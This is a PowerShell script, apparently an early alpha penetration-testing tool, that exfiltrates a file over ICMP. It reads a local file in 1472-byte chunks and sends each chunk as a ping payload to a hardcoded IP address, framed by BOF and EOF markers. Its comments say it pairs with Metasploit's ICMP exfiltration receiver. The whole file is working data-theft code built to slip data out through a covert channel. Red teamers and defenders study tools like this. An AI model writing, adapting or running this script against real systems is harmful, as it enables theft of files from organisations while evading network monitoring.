#    Powershell-ICMP-Sender
#    ICMP Exfiltration script
#    Author: Oddvar Moe (@oddvarmoe)
#    License: BSD 3-Clause
#    Required Dependencies: None
#    Optional Dependencies: None
#    Early alpha version

# Script will take the infile you specify in the $inFile variable and divide it into 1472 byte chunks before sending
# This script also works with Metasploit's ICMP Exfil module: https://www.rapid7.com/db/modules/auxiliary/server/icmp_exfil
# Inspiration from : https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1

# TODO:
# Need transfer check
# Speeding it up using different methods
# Make it function based

    $IPAddress = "192.168.0.74"
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $true
    #$PingOptions.Ttl = 10
    
    # Must be divided into 1472 chunks
    [int]$bufSize = 1472
    $inFile = "C:\temp\test3.txt"
    

    $stream = [System.IO.File]::OpenRead($inFile)
    $chunkNum = 0
    $TotalChunks = [math]::floor($stream.Length / 1472)
    $barr = New-Object byte[] $bufSize
    
    # Start of Transfer
    $sendbytes = ([text.encoding]::ASCII).GetBytes("BOFAwesomefile.txt")
    $ICMPClient.Send($IPAddress,10, $sendbytes, $PingOptions) | Out-Null


    while ($bytesRead = $stream.Read($barr, 0, $bufsize)) {
        $ICMPClient.Send($IPAddress,10, $barr, $PingOptions) | Out-Null
        $ICMPClient.PingCompleted
        
        #Missing check if transfer is okay, added sleep.
        sleep 1
        #$ICMPClient.SendAsync($IPAddress,60 * 1000, $barr, $PingOptions) | Out-Null
        Write-Output "Done with $chunkNum out of $TotalChunks"
        $chunkNum += 1
    }

    # End the transfer
    $sendbytes = ([text.encoding]::ASCII).GetBytes("EOF")
    $ICMPClient.Send($IPAddress,10, $sendbytes, $PingOptions) | Out-Null
    Write-Output "File Transfered"